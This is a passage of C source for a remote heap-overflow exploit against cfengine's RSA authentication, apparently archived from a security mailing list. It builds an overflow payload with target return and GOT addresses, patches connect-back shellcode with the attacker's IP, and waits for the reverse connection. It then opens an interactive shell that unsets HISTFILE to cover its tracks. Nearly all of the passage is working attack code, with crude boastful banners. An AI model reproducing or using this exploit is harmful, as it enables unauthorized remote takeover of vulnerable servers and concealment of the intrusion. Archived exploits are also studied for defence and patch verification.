        return sock;
}

void
shell(int sock)
{
        fd_set  fd_read;
        char buff[1024], *cmd="unset HISTFILE; /bin/uname -a;/usr/bin/id; echo '*** \
oseen are chinese...'\n";  int n;

        FD_ZERO(&fd_read);
        FD_SET(sock, &fd_read);
        FD_SET(0, &fd_read);

        send(sock, cmd, strlen(cmd), 0);

        while(1) {
                FD_SET(sock, &fd_read);
                FD_SET(0,    &fd_read);

                if (select(sock+1, &fd_read, NULL, NULL, NULL) < 0) break;

                if (FD_ISSET(sock, &fd_read)) {
                        if ((n = recv(sock, buff, sizeof(buff), 0)) < 0){
                                fprintf(stderr, "[+] EOF\n");
                                exit(2);
                        }

                        if (write(1, buff, n) <0) break;
                }

                if (FD_ISSET(0, &fd_read)) {
                        if ((n = read(0, buff, sizeof(buff))) < 0){
                                fprintf(stderr,"[+] EOF\n");
                                exit(2);
                        }

                        if (send(sock, buff, n, 0) < 0) break;
                }
        }

        fprintf(stderr,"[+] Connection lost.\n\n");
        exit(0);
}

unsigned char
*get_my_ip_addr(int sockfd, struct ifreq *ifr)
{
	struct sockaddr_in sin;
	char *b = (char *) malloc(4);

	if (ioctl(sockfd ,SIOCGIFADDR,ifr) < 0) {
                fprintf(stderr, "Unable to get the local IP Address, use -d.\n");
		exit(1);
        }

	memcpy(&sin, &ifr->ifr_addr, sizeof(struct sockaddr_in));
	memcpy(b, (char *) &sin.sin_addr.s_addr, 4);
	return b;
}

int
main (int argc,char *argv[])
{
        char buf1[512];
        char buf2[512];
        char host[256];
        char pass[256]="changeme";
        char data;

        int  type= 0;
        int c=0;
        int port=8001;
        char device[256] = "eth0";
	unsigned char *ptr;

        struct hostent *hp;
        struct sockaddr_in sin_listener;
	struct ifreq ifr;
        struct timeval timeout;

        fd_set fdread;

	int delay	= 12;
        int i           = 0;
	int mode	= 0;
	int local_port	= 0;
        int opt         = 0;
        int ret 	= 0;
	int sin_len 	= sizeof (struct sockaddr_in);
        int sock        = 0;
	int sock2	= 0;
	int sockd	= 0;
        int listener	= 0;
	int time_out	= 4;
	int tmp		= 0;

        srand(getpid());

        fprintf(stdout,"cfengine rsa heap remote exploit ....s\n");
        fprintf(stdout,"--------------------------------------------------(need \
money.to..fk..girl..)\n");

        while((c=getopt(argc,argv,"h:p:a:t:")) !=EOF)
        {
                switch(c)
                {
                        case 'p':
                                port=atoi(optarg);
                                if ((port <= 0) || (port > 65535)) {
                                        fprintf(stderr,"Invalid port.\n\n");
                                        exit(1);
                                }
                                break;
                        case 'a':
                                memset(pass,0x0,sizeof(pass));
                                strncpy(pass,optarg,sizeof(pass) - 1);
                                break;
                        case 't':
                                type = atoi(optarg);
                                if (type == 0 || type > sizeof(targets) / 28) {
                                        for(i = 0; i < sizeof(targets) / 28; i++)
                                        fprintf(stderr, "%02d. %s - %s      [0x%08x - \
                0x%08x]\n",
                                                i + 1, targets[i].distro, \
targets[i].type, targets[i].ret, targets[i].got);  return -1;
                                }
                                break;
                        case 'h':
                                memset(host,0x0,sizeof(host));
                                strncpy(host,optarg,sizeof(host) - 1);
                                break;

                        default:
                                usage(argv[[0]](#0));
                                exit(1);
                                break;
                }
        }

        timeout.tv_sec = time_out;
        timeout.tv_usec = 0;

        if (strlen(host) == 0) {
                usage(argv[[0]](#0));
                exit(1);
        }
        sock=openhost(host, 5308);

        if (sock==-1) {
                fprintf(stderr,"- Unable to connect.\n\n");
                exit(1);
        }

	strncpy(ifr.ifr_name, device, 15);

        if ((sockd = socket(AF_INET, SOCK_DGRAM, 17)) < 0) {
                fprintf(stderr, "socket() error.\n");
                return -1;
        }

        if ((listener = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
                fprintf(stderr, "socket() error.\n");
                return -1;
        }

	ptr = get_my_ip_addr(sockd, &ifr);
       memcpy(&sin_listener.sin_addr.s_addr, ptr, 4);

        sin_listener.sin_family = AF_INET;
	memset(&sin_listener.sin_zero, 0x00, 8);

        while(1) {
                local_port = local_port = 45295;
                sin_listener.sin_port = htons(local_port);
                if (!bind(listener, (struct sockaddr *) &sin_listener, sin_len)) \
break;  }

	listen(listener, 1);
        fprintf(stdout, "[+] lisntener...\n");
        linux_connect_back[[33]](#33) = (unsigned int) *(ptr + 0);
        linux_connect_back[[34]](#34) = (unsigned int) *(ptr + 1);
        linux_connect_back[[35]](#35) = (unsigned int) *(ptr + 2);
        linux_connect_back[[36]](#36) = (unsigned int) *(ptr + 3);

        memset(buf2,  0x0, sizeof(buf2));
        memset(buf1, 0x90, sizeof(buf1));

        for(i=0;i < strlen(linux_connect_back); i++) buf1[i+50] = \
linux_connect_back[i];

        buf1[[0]](#0) = (0x41414141 & 0x000000ff);
        buf1[[1]](#1) = (0x41414141 & 0x0000ff00) >> 8;
        buf1[[2]](#2) = (0x41414141 & 0x00ff0000) >> 16;
        buf1[[3]](#3) = (0x41414141 & 0xff000000) >> 24;

        buf1[[4]](#4) = (0x58585858 & 0x000000ff);
        buf1[[5]](#5) = (0x58585858 & 0x0000ff00) >> 8;
        buf1[[6]](#6) = (0x58585858 & 0x00ff0000) >> 16;
        buf1[[7]](#7) = (0x58585858 & 0xff000000) >> 24;

        buf1[[8]](#8) = (0xfffffffc & 0x000000ff);
        buf1[[9]](#9) = (0xfffffffc & 0x0000ff00) >> 8;
        buf1[[10]](#10) = (0xfffffffc & 0x00ff0000) >> 16;
        buf1[[11]](#11) = (0xfffffffc & 0xff000000) >> 24;

        buf1[[12]](#12) = (0xffffffff & 0x000000ff);
        buf1[[13]](#13) = (0xffffffff & 0x0000ff00) >> 8;
        buf1[[14]](#14) = (0xffffffff & 0x00ff0000) >> 16;
        buf1[[15]](#15) = (0xffffffff & 0xff000000) >> 24;

        buf1[[16]](#16) = (targets[type - 1].got -12 & 0x000000ff);
        buf1[[17]](#17) = (targets[type - 1].got -12 & 0x0000ff00) >> 8;
        buf1[[18]](#18) = (targets[type - 1].got -12 & 0x00ff0000) >> 16;
        buf1[[19]](#19) = (targets[type - 1].got -12 & 0xff000000) >> 24;

        buf1[[20]](#20) = (targets[type - 1].ret & 0x000000ff);
        buf1[[21]](#21) = (targets[type - 1].ret & 0x0000ff00) >> 8;
        buf1[[22]](#22) = (targets[type - 1].ret & 0x00ff0000) >> 16;
        buf1[[23]](#23) = (targets[type - 1].ret & 0xff000000) >> 24;

      for(i = 0; i < 300 - sizeof(linux_connect_back) -80; i+=2)
      {
        buf1[i + 24] = 0x7f;
        buf1[i + 25] = 0xeb;
      }
      for(; i < 300 - sizeof(linux_connect_back) - 1; i++)
        buf1[i + 24] = 0x90;
      strcpy(buf1 + i + 24, linux_connect_back);
      buf1[i + 24+ sizeof(linux_connect_back) - 1] = '\n';
      buf1[i + 25 + sizeof(linux_connect_back) - 1] = '\0';

	 sprintf(buf2,   "k0000023CAUTH HARE KRISHNA HAREk0003000SAUTH n00000010 \
00001000%s\r\n", buf1);
        fprintf(stdout, "Connected, sending code...\n");
        fprintf(stdout, "[+] Ret: 0x%08x\n", targets[type - 1].ret);
        fprintf(stdout, "[+] Got: 0x%08x\n", targets[type - 1].got);
 while(1) {
                write(sock, buf2, strlen(buf2));
                close(sock);
                sleep(2);
                FD_ZERO(&fdread);
        	FD_SET(listener, &fdread);

	        timeout.tv_sec = time_out;
	        timeout.tv_usec = 0;

	        while(1) {

        	        ret = select(FD_SETSIZE, &fdread, NULL, NULL, &timeout);

	                if (ret < 0) {
	                        close(sock);
        	                close(listener);
	                        fprintf(stderr, "select() error.\n");
        	                return -1;
	                }

                	if (ret == 0) {
				fprintf(stderr, "[+] Failed, waiting %d seconds.\n"
						"[+] Use ctrl-c to abort.\n", delay);
				sleep(delay);
				break;
	                }

        	        if(FD_ISSET(listener, &fdread)) {
				sock2 = accept(listener, (struct sockaddr *)&sin_listener, &sin_len);
				close(sock);
				close(listener);

			        fprintf(stderr, "[+] ownedbyOseen!\n"
						"-----------------------------------------------------------\n");
	                        shell(sock2);
				close(sock2);
				return 0;
			}
		}

	}

	fprintf(stderr, "[+] Exploit failed.\n");
	close(listener);
	close(sock);
	return 0;

}

[[prev in list](?l=bugtraq&m=110886857016418&w=2)] [[next in list](?l=bugtraq&m=110886869922397&w=2)] [prev in thread] [[next in thread](?l=cfengine-help&m=110896482308904&w=2)]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


